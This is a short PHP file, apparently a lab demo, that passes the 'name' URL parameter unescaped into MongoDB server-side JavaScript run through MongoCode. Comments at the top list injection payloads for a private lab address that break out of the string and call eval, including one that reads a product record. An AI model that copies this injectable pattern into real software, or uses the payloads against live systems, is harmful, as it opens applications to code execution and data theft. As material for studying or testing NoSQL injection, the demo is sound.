
<?php

// http://172.16.163.129/mongodb/js/greeting.php?name=jose';}//

// jose' + eval(1+1);}//
// http://172.16.163.129/mongodb/js/greeting.php?name=jose%20'+%2B+eval(1%2B1);}//

// jose' + eval(db.products.findOne());}//
//http://172.16.163.129/mongodb/js/greeting.php?name=jose%20'+%2B+eval(db.products.findOne());}//

/*


function inc( name , howMuch ){
    return db.eval(
        function(){
            var t = db.things.findOne( { name : name } );
            t = t || { name : name , num : 0 , total : 0 , avg : 0 };
            t.num++;
            t.total += howMuch;
            t.avg = t.total / t.num;
            db.things.save( t );
            return t;
        }
    );
}

db.things.remove( {} );
print( tojson( inc( "eliot" , 2 )) );
print( tojson( inc( "eliot" , 3 )) );




*/
 
$m = new Mongo(); // connect
$db = $m->selectDB("rooted");

$collection = $db->products;


$func = 
    "function(greeting) { ".
        "return greeting+', $_GET[name] , dice '+greeter;".
    "}";


$scope = array("greeter" => "CHEMI");

$code = new MongoCode($func, $scope);


$response = $db->execute($code, array("Hasta luego"));

echo "<br />" . $response['retval'] . "<br />";

echo "<pre>";
print_r($response);
echo "</pre>";


?>

